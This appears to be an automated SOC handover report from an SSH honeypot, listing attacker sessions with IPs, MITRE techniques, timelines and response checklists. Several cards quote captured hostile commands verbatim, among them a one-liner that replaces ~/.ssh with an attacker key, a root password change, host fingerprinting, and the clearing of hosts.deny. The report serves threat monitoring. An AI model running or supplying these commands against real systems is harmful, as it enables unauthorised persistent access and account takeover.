# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-09 |
| **Generated At** | 2026-03-09T14:58:33Z |
| **Shift Time** | 14:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **316** |
| Confirmed Threats | **227** |
| False Positives Filtered | **89** (28.2%) |
| Unique Attacker IPs | **101** |
| Countries of Origin | **27** |
| High Severity Cases | **48** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **268** |
| Malware Samples Analyzed | **0** HIGH · **0** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (41)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1c129d6e93ae

| Field | Detail |
|---|---|
| **Source IP** | `47.251.72.8` |
| **First Seen** | 2026-03-09 01:46 |
| **Last Seen** | 2026-03-09 01:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 01:46:52` | `cowrie.session.connect` |
| `2026-03-09 01:46:52` | `cowrie.client.version` |
| `2026-03-09 01:46:52` | `cowrie.client.kex` |
| `2026-03-09 01:46:53` | `cowrie.login.success` |
| `2026-03-09 01:46:53` | `cowrie.session.params` |
| `2026-03-09 01:46:53` | `cowrie.command.input` |
| `2026-03-09 01:46:53` | `cowrie.command.failed` |
| `2026-03-09 01:46:54` | `cowrie.log.closed` |
| `2026-03-09 01:46:54` | `cowrie.session.params` |
| `2026-03-09 01:46:54` | `cowrie.command.input` |
| `2026-03-09 01:46:55` | `cowrie.session.file_download` |
| `2026-03-09 01:46:55` | `cowrie.log.closed` |
| `2026-03-09 01:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.72.8` to AbuseIPDB if not already reported
- [ ] Block `47.251.72.8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21231c6abfab

| Field | Detail |
|---|---|
| **Source IP** | `47.251.72.8` |
| **First Seen** | 2026-03-09 01:46 |
| **Last Seen** | 2026-03-09 01:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 01:46:58` | `cowrie.session.connect` |
| `2026-03-09 01:46:58` | `cowrie.client.version` |
| `2026-03-09 01:46:58` | `cowrie.client.kex` |
| `2026-03-09 01:46:59` | `cowrie.login.success` |
| `2026-03-09 01:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.72.8` to AbuseIPDB if not already reported
- [ ] Block `47.251.72.8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3557215fc3

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:52 |
| **Last Seen** | 2026-03-09 02:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:52:12` | `cowrie.session.connect` |
| `2026-03-09 02:52:13` | `cowrie.client.version` |
| `2026-03-09 02:52:13` | `cowrie.client.kex` |
| `2026-03-09 02:52:15` | `cowrie.login.success` |
| `2026-03-09 02:52:16` | `cowrie.session.params` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.log.closed` |
| `2026-03-09 02:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e958fd716b88

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:53 |
| **Last Seen** | 2026-03-09 02:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:53:28` | `cowrie.session.connect` |
| `2026-03-09 02:53:28` | `cowrie.client.version` |
| `2026-03-09 02:53:28` | `cowrie.client.kex` |
| `2026-03-09 02:53:30` | `cowrie.login.success` |
| `2026-03-09 02:53:30` | `cowrie.session.params` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:31` | `cowrie.log.closed` |
| `2026-03-09 02:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed7a899d18a0

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:54 |
| **Last Seen** | 2026-03-09 02:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:54:43` | `cowrie.session.connect` |
| `2026-03-09 02:54:44` | `cowrie.client.version` |
| `2026-03-09 02:54:44` | `cowrie.client.kex` |
| `2026-03-09 02:54:46` | `cowrie.login.success` |
| `2026-03-09 02:54:48` | `cowrie.session.params` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.log.closed` |
| `2026-03-09 02:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c9220c6108

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:55 |
| **Last Seen** | 2026-03-09 02:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:55:58` | `cowrie.session.connect` |
| `2026-03-09 02:55:58` | `cowrie.client.version` |
| `2026-03-09 02:55:58` | `cowrie.client.kex` |
| `2026-03-09 02:56:00` | `cowrie.login.success` |
| `2026-03-09 02:56:01` | `cowrie.session.params` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.log.closed` |
| `2026-03-09 02:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40ee19dd3f4

| Field | Detail |
|---|---|
| **Source IP** | `101.126.129.179` |
| **First Seen** | 2026-03-09 03:51 |
| **Last Seen** | 2026-03-09 03:56 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 03:51:48` | `cowrie.session.connect` |
| `2026-03-09 03:51:48` | `cowrie.client.version` |
| `2026-03-09 03:51:48` | `cowrie.client.kex` |
| `2026-03-09 03:51:49` | `cowrie.login.success` |
| `2026-03-09 03:56:49` | `cowrie.session.file_upload` |
| `2026-03-09 03:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.129.179` to AbuseIPDB if not already reported
- [ ] Block `101.126.129.179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a351d28731

| Field | Detail |
|---|---|
| **Source IP** | `138.68.169.179` |
| **First Seen** | 2026-03-09 04:07 |
| **Last Seen** | 2026-03-09 04:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:07:53` | `cowrie.session.connect` |
| `2026-03-09 04:07:54` | `cowrie.client.version` |
| `2026-03-09 04:07:54` | `cowrie.client.kex` |
| `2026-03-09 04:07:57` | `cowrie.login.success` |
| `2026-03-09 04:07:59` | `cowrie.session.params` |
| `2026-03-09 04:07:59` | `cowrie.command.input` |
| `2026-03-09 04:07:59` | `cowrie.command.input` |
| `2026-03-09 04:07:59` | `cowrie.command.input` |
| `2026-03-09 04:07:59` | `cowrie.command.input` |
| `2026-03-09 04:08:00` | `cowrie.log.closed` |
| `2026-03-09 04:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.169.179` to AbuseIPDB if not already reported
- [ ] Block `138.68.169.179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68fcad25aafa

| Field | Detail |
|---|---|
| **Source IP** | `138.68.169.179` |
| **First Seen** | 2026-03-09 04:09 |
| **Last Seen** | 2026-03-09 04:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:09:33` | `cowrie.session.connect` |
| `2026-03-09 04:09:34` | `cowrie.client.version` |
| `2026-03-09 04:09:34` | `cowrie.client.kex` |
| `2026-03-09 04:09:37` | `cowrie.login.success` |
| `2026-03-09 04:09:39` | `cowrie.session.params` |
| `2026-03-09 04:09:39` | `cowrie.command.input` |
| `2026-03-09 04:09:39` | `cowrie.command.input` |
| `2026-03-09 04:09:39` | `cowrie.command.input` |
| `2026-03-09 04:09:39` | `cowrie.command.input` |
| `2026-03-09 04:09:40` | `cowrie.log.closed` |
| `2026-03-09 04:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.169.179` to AbuseIPDB if not already reported
- [ ] Block `138.68.169.179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd7746ac318

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:14 |
| **Last Seen** | 2026-03-09 04:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:14:42` | `cowrie.session.connect` |
| `2026-03-09 04:14:42` | `cowrie.client.version` |
| `2026-03-09 04:14:42` | `cowrie.client.kex` |
| `2026-03-09 04:14:43` | `cowrie.login.success` |
| `2026-03-09 04:14:43` | `cowrie.session.params` |
| `2026-03-09 04:14:43` | `cowrie.command.input` |
| `2026-03-09 04:14:43` | `cowrie.command.failed` |
| `2026-03-09 04:14:43` | `cowrie.log.closed` |
| `2026-03-09 04:14:43` | `cowrie.session.params` |
| `2026-03-09 04:14:43` | `cowrie.command.input` |
| `2026-03-09 04:14:43` | `cowrie.session.file_download` |
| `2026-03-09 04:14:43` | `cowrie.log.closed` |
| `2026-03-09 04:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff3db877095

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:14 |
| **Last Seen** | 2026-03-09 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:14:45` | `cowrie.session.connect` |
| `2026-03-09 04:14:45` | `cowrie.client.version` |
| `2026-03-09 04:14:45` | `cowrie.client.kex` |
| `2026-03-09 04:14:45` | `cowrie.login.success` |
| `2026-03-09 04:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae586476c63d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:22 |
| **Last Seen** | 2026-03-09 04:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:22:48` | `cowrie.session.connect` |
| `2026-03-09 04:22:48` | `cowrie.client.version` |
| `2026-03-09 04:22:48` | `cowrie.client.kex` |
| `2026-03-09 04:22:49` | `cowrie.login.success` |
| `2026-03-09 04:22:49` | `cowrie.session.params` |
| `2026-03-09 04:22:49` | `cowrie.command.input` |
| `2026-03-09 04:22:49` | `cowrie.command.failed` |
| `2026-03-09 04:22:49` | `cowrie.log.closed` |
| `2026-03-09 04:22:49` | `cowrie.session.params` |
| `2026-03-09 04:22:49` | `cowrie.command.input` |
| `2026-03-09 04:22:49` | `cowrie.session.file_download` |
| `2026-03-09 04:22:49` | `cowrie.log.closed` |
| `2026-03-09 04:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47ba346f4fd0

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:22 |
| **Last Seen** | 2026-03-09 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:22:51` | `cowrie.session.connect` |
| `2026-03-09 04:22:51` | `cowrie.client.version` |
| `2026-03-09 04:22:51` | `cowrie.client.kex` |
| `2026-03-09 04:22:52` | `cowrie.login.success` |
| `2026-03-09 04:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdef166a5cf0

| Field | Detail |
|---|---|
| **Source IP** | `35.229.135.179` |
| **First Seen** | 2026-03-09 05:28 |
| **Last Seen** | 2026-03-09 05:28 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 05:28:08` | `cowrie.session.connect` |
| `2026-03-09 05:28:08` | `cowrie.client.version` |
| `2026-03-09 05:28:08` | `cowrie.client.kex` |
| `2026-03-09 05:28:09` | `cowrie.login.success` |
| `2026-03-09 05:28:53` | `cowrie.session.file_upload` |
| `2026-03-09 05:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.229.135.179` to AbuseIPDB if not already reported
- [ ] Block `35.229.135.179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52265ad66681

| Field | Detail |
|---|---|
| **Source IP** | `180.76.185.165` |
| **First Seen** | 2026-03-09 06:16 |
| **Last Seen** | 2026-03-09 06:16 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:UJkklaMLJqMP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'}, {'url': '', 'sha256': '01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 06:16:15` | `cowrie.session.connect` |
| `2026-03-09 06:16:15` | `cowrie.client.version` |
| `2026-03-09 06:16:15` | `cowrie.client.kex` |
| `2026-03-09 06:16:17` | `cowrie.login.success` |
| `2026-03-09 06:16:19` | `cowrie.session.params` |
| `2026-03-09 06:16:19` | `cowrie.command.input` |
| `2026-03-09 06:16:19` | `cowrie.command.failed` |
| `2026-03-09 06:16:19` | `cowrie.log.closed` |
| `2026-03-09 06:16:19` | `cowrie.session.params` |
| `2026-03-09 06:16:19` | `cowrie.command.input` |
| `2026-03-09 06:16:20` | `cowrie.session.file_download` |
| `2026-03-09 06:16:20` | `cowrie.log.closed` |
| `2026-03-09 06:16:32` | `cowrie.session.params` |
| `2026-03-09 06:16:32` | `cowrie.command.input` |
| `2026-03-09 06:16:32` | `cowrie.log.closed` |
| `2026-03-09 06:16:33` | `cowrie.session.params` |
| `2026-03-09 06:16:33` | `cowrie.command.input` |
| `2026-03-09 06:16:33` | `cowrie.log.closed` |
| `2026-03-09 06:16:34` | `cowrie.session.params` |
| `2026-03-09 06:16:34` | `cowrie.command.input` |
| `2026-03-09 06:16:34` | `cowrie.session.file_download` |
| `2026-03-09 06:16:34` | `cowrie.log.closed` |
| `2026-03-09 06:16:35` | `cowrie.session.params` |
| `2026-03-09 06:16:35` | `cowrie.command.input` |
| `2026-03-09 06:16:36` | `cowrie.log.closed` |
| `2026-03-09 06:16:38` | `cowrie.session.params` |
| `2026-03-09 06:16:38` | `cowrie.command.input` |
| `2026-03-09 06:16:38` | `cowrie.log.closed` |
| `2026-03-09 06:16:40` | `cowrie.session.params` |
| `2026-03-09 06:16:40` | `cowrie.command.input` |
| `2026-03-09 06:16:40` | `cowrie.command.input` |
| `2026-03-09 06:16:41` | `cowrie.log.closed` |
| `2026-03-09 06:16:49` | `cowrie.session.params` |
| `2026-03-09 06:16:49` | `cowrie.command.input` |
| `2026-03-09 06:16:49` | `cowrie.log.closed` |
